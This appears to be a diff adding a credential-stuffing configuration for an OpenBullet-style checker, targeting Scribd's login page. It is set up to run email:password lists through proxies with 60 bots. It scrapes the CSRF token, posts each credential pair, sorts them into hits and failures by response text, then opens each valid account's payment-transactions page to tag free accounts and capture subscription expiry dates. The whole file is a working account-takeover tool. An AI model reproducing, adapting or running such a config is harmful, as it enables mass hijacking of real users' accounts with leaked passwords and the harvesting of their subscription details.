@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Scribd",
+  "SuggestedBots": 60,
+  "LastModified": "2019-05-18T02:47:53.0657113+05:30",
+  "AdditionalInfo": "",
+  "Author": "✘-Gunpoint69",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#REQUEST_GET REQUEST GET "https://www.scribd.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\" />" -> VAR "x-csrf-token" "" "  ✘-Gunpoint69" 
+
+#REQUEST_Login REQUEST POST "https://www.scribd.com/login" 
+  CONTENT "login_or_email=<USER>&login_password=<PASS>&rememberme=on&signup_location=https%3A%2F%2Fwww.scribd.com%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en" 
+  HEADER "content-length: 120" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://www.scribd.com" 
+  HEADER "referer: https://www.scribd.com/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+  HEADER "x-csrf-token: <x-csrf-token>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "x-tried-csrf: 1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password. Please try again" 
+    KEY "No account found with that email or username. Please try again or sign up" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true" 
+
+REQUEST GET "https://www.scribd.com/account-settings/payment-transactions" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en" 
+  HEADER "referer: https://www.scribd.com/account-settings" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "x-tried-csrf: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"payment_transactions\":[]}" 
+
+#_✘-Gunpoint69 PARSE "<SOURCE>" LR "-" "\"},\"refunded\":false,\"price" -> CAP "Expiry" "" "   ✘-Gunpoint69" 
+
